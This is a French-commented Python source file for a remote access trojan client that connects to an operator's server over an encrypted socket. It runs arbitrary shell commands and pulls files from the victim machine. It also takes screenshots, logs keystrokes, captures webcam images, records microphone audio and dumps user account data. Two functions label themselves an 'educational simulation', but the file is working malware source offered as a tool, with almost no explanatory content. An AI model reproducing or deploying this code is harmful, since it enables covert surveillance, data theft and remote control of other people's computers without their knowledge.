#!/usr/bin/env python3
"""
Client RAT - Version 9 avec audio buggué
"""
import socket
import json
import time
import platform
import subprocess
import getpass
import base64
import tempfile
import os
import threading
from cryptography.fernet import Fernet

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    import cv2
    HAS_OPENCV = True
except ImportError:
    HAS_OPENCV = False

try:
    import pyaudio
    import wave
    HAS_AUDIO = True
except ImportError:
    HAS_AUDIO = False

class RATClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        
        self.key = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='
        self.cipher = Fernet(self.key)
        
        # Keylogger
        self.keylogger_active = False
        self.keylog_buffer = []
        self.keylogger_listener = None
        
    def _send_message(self, message):
        """Envoie un message avec protocole de taille"""
        try:
            json_data = json.dumps(message)
            encrypted_data = self.cipher.encrypt(json_data.encode('utf-8'))
            
            size_bytes = len(encrypted_data).to_bytes(4, 'big')
            self.socket.sendall(size_bytes)
            self.socket.sendall(encrypted_data)
            return True
        except Exception as e:
            print(f"[DEBUG] Erreur envoi: {e}")
            return False
    
    def _receive_message(self):
        """Reçoit un message complet"""
        try:
            size_data = b''
            while len(size_data) < 4:
                chunk = self.socket.recv(4 - len(size_data))
                if not chunk:
                    return None
                size_data += chunk
            
            message_size = int.from_bytes(size_data, 'big')
            
            if message_size > 50 * 1024 * 1024:
                print(f"[WARNING] Message trop gros: {message_size}")
                return None
            
            message_data = b''
            while len(message_data) < message_size:
                chunk_size = min(4096, message_size - len(message_data))
                chunk = self.socket.recv(chunk_size)
                if not chunk:
                    return None
                message_data += chunk
            
            return message_data
        except Exception as e:
            print(f"[DEBUG] Erreur réception: {e}")
            return None
    
    def connect(self):
        """Se connecte au serveur"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            
            client_info = {
                'hostname': socket.gethostname(),
                'username': getpass.getuser(),
                'os': platform.system(),
                'os_version': platform.release(),
                'architecture': platform.machine(),
                'python_version': platform.python_version(),
                'timestamp': time.time()
            }
            
            if not self._send_message(client_info):
                return False
            
            print(f"[+] Connecté au serveur")
            return True
        except Exception as e:
            print(f"[-] Erreur de connexion: {e}")
            return False
    
    def execute_command(self, command, args):
        """Exécute une commande"""
        try:
            if command == "help":
                return self.cmd_help()
            elif command == "ipconfig":
                return self.cmd_ipconfig()
            elif command == "shell":
                return self.cmd_shell(args)
            elif command == "screenshot":
                return self.cmd_screenshot()
            elif command == "download":
                return self.cmd_download(args)
            elif command == "upload":
                return self.cmd_upload(args)
            elif command == "search":
                return self.cmd_search(args)
            elif command == "hashdump":
                return self.cmd_hashdump()
            elif command == "keylogger":
                return self.cmd_keylogger(args)
            elif command == "webcam_snapshot":
                return self.cmd_webcam_snapshot()
            elif command == "webcam_stream":
                return self.cmd_webcam_stream()
            elif command == "record_audio":
                return self.cmd_record_audio(args)
            else:
                return {'output': f'Commande non supportée: {command}'}
        except Exception as e:
            return {'output': f'Erreur: {str(e)}'}
    
    def cmd_help(self):
        """Commande help"""
        help_text = """Commandes disponibles:
  help            - Affiche cette aide
  ipconfig        - Configuration réseau
  shell           - Exécute une commande
  screenshot      - Capture d'écran
  download        - Télécharge un fichier
  upload          - Upload un fichier
  search          - Recherche de fichiers
  hashdump        - Dump des hash
  keylogger       - Keylogger start/stop
  webcam_snapshot - Photo webcam
  webcam_stream   - Stream webcam
  record_audio    - Enregistrement audio
"""
        return {'output': help_text}
    
    # ... (autres méthodes identiques à v8 pour économiser l'espace)
    
    def cmd_ipconfig(self):
        """Commande ipconfig"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=10)
            else:
                result = subprocess.run(["ip", "addr", "show"], capture_output=True, text=True, timeout=10)
                if result.returncode != 0:
                    result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=10)
            
            return {'output': result.stdout if result.returncode == 0 else result.stderr}
        except Exception as e:
            return {'output': f'Erreur ipconfig: {str(e)}'}
    
    def cmd_shell(self, args):
        """Commande shell"""
        if not args:
            return {'output': 'Usage: shell <commande>'}
        
        try:
            command = " ".join(args)
            if platform.system() == "Windows":
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(["/bin/sh", "-c", command], capture_output=True, text=True, timeout=30)
            
            output = result.stdout
            if result.stderr:
                output += f"\nSTDERR:\n{result.stderr}"
            
            return {'output': output or 'Commande exécutée (pas de sortie)'}
        except subprocess.TimeoutExpired:
            return {'output': 'Timeout de commande (30s)'}
        except Exception as e:
            return {'output': f'Erreur shell: {str(e)}'}
    
    def cmd_screenshot(self):
        """Commande screenshot"""
        if not HAS_PIL:
            return {'output': 'PIL non disponible pour screenshot'}
        
        try:
            screenshot = ImageGrab.grab()
            
            from io import BytesIO
            img_buffer = BytesIO()
            screenshot.save(img_buffer, format='PNG')
            img_buffer.seek(0)
            
            image_data = base64.b64encode(img_buffer.getvalue()).decode()
            img_buffer.close()
            
            return {
                'output': 'Screenshot capturé',
                'image_data': image_data
            }
            
        except Exception as e:
            return {'output': f'Erreur screenshot: {str(e)}'}
    
    def cmd_download(self, args):
        """Commande download"""
        if not args:
            return {'output': 'Usage: download <chemin_fichier>'}
        
        # Implementation identique à v8...
        file_path = args[0]
        
        try:
            if not os.path.exists(file_path):
                return {'output': f'Fichier inexistant: {file_path}'}
            
            file_size = os.path.getsize(file_path)
            if file_size > 50 * 1024 * 1024:
                return {'output': f'Fichier trop volumineux: {file_size} bytes'}
            
            with open(file_path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode()
            
            filename = os.path.basename(file_path)
            
            return {
                'output': f'Fichier prêt: {filename} ({file_size} bytes)',
                'file_data': file_data,
                'filename': filename,
                'size': file_size
            }
        except Exception as e:
            return {'output': f'Erreur download: {str(e)}'}
    
    def cmd_upload(self, args):
        """Commande upload"""
        if len(args) < 2:
            return {'output': 'Usage: upload <chemin_destination> <données_base64>'}
        
        dest_path = args[0]
        file_data_b64 = args[1]
        
        try:
            file_data = base64.b64decode(file_data_b64)
            
            dest_dir = os.path.dirname(dest_path)
            if dest_dir:
                os.makedirs(dest_dir, exist_ok=True)
            
            with open(dest_path, "wb") as f:
                f.write(file_data)
            
            return {'output': f'Fichier uploadé: {dest_path} ({len(file_data)} bytes)'}
        except Exception as e:
            return {'output': f'Erreur upload: {str(e)}'}
    
    def cmd_search(self, args):
        """Commande search"""
        if not args:
            return {'output': 'Usage: search <pattern>'}
        
        pattern = args[0]
        
        try:
            search_root = os.path.expanduser("~")
            found_files = []
            count = 0
            max_results = 50
            
            for root, dirs, files in os.walk(search_root):
                if count >= max_results:
                    break
                for file in files:
                    if count >= max_results:
                        break
                    if pattern.lower() in file.lower():
                        full_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(full_path)
                            found_files.append(f"{full_path} ({file_size} bytes)")
                        except:
                            found_files.append(full_path)
                        count += 1
            
            if found_files:
                result = f"Fichiers trouvés ({len(found_files)}):\n" + "\n".join(found_files)
                if count >= max_results:
                    result += f"\n... (limité à {max_results} résultats)"
            else:
                result = f"Aucun fichier trouvé pour '{pattern}'"
            
            return {'output': result}
        except Exception as e:
            return {'output': f'Erreur search: {str(e)}'}
    
    def cmd_hashdump(self):
        """Commande hashdump"""
        try:
            if platform.system() == "Windows":
                return self._windows_hashdump()
            else:
                return self._linux_hashdump()
        except Exception as e:
            return {'output': f'Erreur hashdump: {str(e)}'}
    
    def _windows_hashdump(self):
        """Hashdump Windows"""
        output = "HASHDUMP Windows (simulation éducative):\n"
        output += "Note: L'accès réel à SAM nécessite des privilèges administrateur\n"
        
        try:
            result = subprocess.run(["net", "user"], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                output += "Utilisateurs locaux:\n" + result.stdout
            else:
                output += "Impossible d'énumérer les utilisateurs"
        except:
            output += "Commande net non disponible"
        
        return {'output': output}
    
    def _linux_hashdump(self):
        """Hashdump Linux"""
        output = "HASHDUMP Linux (simulation éducative):\n"
        
        try:
            with open("/etc/passwd", "r") as f:
                passwd_content = f.read()
            output += "Contenu de /etc/passwd:\n" + passwd_content[:1000]
            if len(passwd_content) > 1000:
                output += "\n... (tronqué)"
        except:
            output += "Impossible de lire /etc/passwd"
        
        output += "\n\nNote: /etc/shadow nécessite des privilèges root"
        return {'output': output}
    
    def cmd_keylogger(self, args):
        """Commande keylogger"""
        if not args or args[0] not in ["start", "stop"]:
            return {'output': 'Usage: keylogger start|stop'}
        
        if not HAS_PYNPUT:
            return {'output': 'pynput non disponible pour le keylogger'}
        
        action = args[0]
        
        if action == "start":
            if self.keylogger_active:
                return {'output': 'Keylogger déjà actif'}
            
            try:
                self.keylogger_active = True
                self.keylog_buffer = []
                
                def on_press(key):
                    if not self.keylogger_active:
                        return False
                    try:
                        if hasattr(key, 'char') and key.char:
                            self.keylog_buffer.append(key.char)
                        else:
                            self.keylog_buffer.append(f"[{key.name}]")
                    except:
                        self.keylog_buffer.append("[SPECIAL]")
                    
                    if len(self.keylog_buffer) > 1000:
                        self.keylog_buffer = self.keylog_buffer[-500:]
                
                self.keylogger_listener = keyboard.Listener(on_press=on_press)
                self.keylogger_listener.start()
                
                return {'output': 'Keylogger démarré'}
                
            except Exception as e:
                self.keylogger_active = False
                self.keylogger_listener = None
                return {'output': f'Erreur keylogger: {str(e)}'}
        
        elif action == "stop":
            if not self.keylogger_active:
                return {'output': 'Keylogger non actif'}
            
            try:
                self.keylogger_active = False
                
                if self.keylogger_listener:
                    self.keylogger_listener.stop()
                    self.keylogger_listener = None
                
                if self.keylog_buffer:
                    keylog_data = "".join(self.keylog_buffer)
                    buffer_size = len(self.keylog_buffer)
                    self.keylog_buffer = []
                    
                    return {
                        'output': f'Keylogger arrêté. {buffer_size} touches capturées:\n{keylog_data}'
                    }
                else:
                    return {'output': 'Keylogger arrêté. Aucune donnée capturée.'}
                    
            except Exception as e:
                return {'output': f'Erreur arrêt keylogger: {str(e)}'}
    
    def cmd_webcam_snapshot(self):
        """Commande webcam_snapshot"""
        if not HAS_OPENCV:
            return {'output': 'OpenCV non disponible pour la webcam'}
        
        try:
            cap = cv2.VideoCapture(0)
            
            if not cap.isOpened():
                return {'output': 'Impossible d\'accéder à la webcam'}
            
            ret, frame = cap.read()
            cap.release()
            
            if not ret:
                return {'output': 'Impossible de capturer une image'}
            
            _, buffer = cv2.imencode('.jpg', frame)
            image_data = base64.b64encode(buffer).decode()
            
            return {
                'output': 'Photo webcam capturée',
                'image_data': image_data
            }
        except Exception as e:
            return {'output': f'Erreur webcam: {str(e)}'}
    
    def cmd_webcam_stream(self):
        """Commande webcam_stream"""
        return {'output': 'Stream webcam - Fonctionnalité à implémenter complètement'}
    
    def cmd_record_audio(self, args):
        """Commande record_audio - VERSION BUGGUÉE"""
        if not args:
            return {'output': 'Usage: record_audio <durée_secondes>'}
        
        if not HAS_AUDIO:
            return {'output': 'PyAudio non disponible pour l\'enregistrement'}
        
        try:
            duration = int(args[0])
            if duration <= 0 or duration > 60:
                return {'output': 'Durée invalide (1-60 secondes)'}
            
            # Configuration audio basique - PROBLÈMES POTENTIELS
            chunk = 1024
            format = pyaudio.paInt16
            channels = 1  # PROBLÈME: toujours mono
            rate = 44100  # PROBLÈME: rate fixe
            
            p = pyaudio.PyAudio()
            
            # BUG: n'utilise pas forcément le bon périphérique
            try:
                stream = p.open(
                    format=format,
                    channels=channels,
                    rate=rate,
                    input=True,
                    frames_per_buffer=chunk
                )
            except Exception as e:
                p.terminate()
                return {'output': f'Impossible d\'ouvrir le périphérique audio: {str(e)}'}
            
            frames = []
            for _ in range(0, int(rate / chunk * duration)):
                try:
                    data = stream.read(chunk)  # PROBLÈME: pas de gestion d'overflow
                    frames.append(data)
                except Exception as e:
                    # PROBLÈME: continue même en cas d'erreur
                    frames.append(b'\x00' * (chunk * channels * 2))
            
            stream.close()
            p.terminate()
            
            # Crée fichier WAV temporaire
            with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as temp_file:
                temp_path = temp_file.name
            
            try:
                wf = wave.open(temp_path, 'wb')
                wf.setnchannels(channels)
                wf.setsampwidth(2)
                wf.setframerate(rate)
                wf.writeframes(b''.join(frames))
                wf.close()
                
                with open(temp_path, "rb") as f:
                    wav_data = f.read()
                
                os.unlink(temp_path)
                
                audio_data_b64 = base64.b64encode(wav_data).decode()
                
                # PROBLÈME: pas de diagnostic de qualité
                return {
                    'output': f'Audio enregistré ({duration}s) - {len(wav_data)} bytes',
                    'audio_data': audio_data_b64
                }
                
            except Exception as e:
                try:
                    os.unlink(temp_path)
                except:
                    pass
                return {'output': f'Erreur création WAV: {str(e)}'}
                
        except ValueError:
            return {'output': 'Durée invalide - utilisez un nombre entre 1 et 60'}
        except Exception as e:
            return {'output': f'Erreur audio: {str(e)}'}
    
    def start(self):
        """Démarre le client"""
        if not self.connect():
            return
        
        self.running = True
        print("[*] Client démarré - En attente de commandes")
        
        while self.running:
            try:
                data = self._receive_message()
                if not data:
                    break
                
                decrypted_data = self.cipher.decrypt(data)
                command_data = json.loads(decrypted_data.decode('utf-8'))
                
                if command_data.get('type') == 'command':
                    command = command_data.get('command')
                    args = command_data.get('args', [])
                    
                    print(f"[*] Exécution: {command}")
                    result = self.execute_command(command, args)
                    self._send_message(result)
                
            except Exception as e:
                print(f"[-] Erreur traitement: {e}")
                break
        
        self.cleanup()
    
    def cleanup(self):
        """Nettoyage"""
        self.running = False
        self.keylogger_active = False
        
        if self.keylogger_listener:
            try:
                self.keylogger_listener.stop()
                self.keylogger_listener = None
            except:
                pass
        
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        print("[*] Client arrêté")

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Client RAT avec audio")
    parser.add_argument("host", help="Adresse serveur")
    parser.add_argument("port", type=int, help="Port serveur")
    args = parser.parse_args()
    
    client = RATClient(args.host, args.port)
    
    try:
        client.start()
    except KeyboardInterrupt:
        print("\n[*] Arrêt du client")
        client.cleanup()

if __name__ == "__main__":
    main()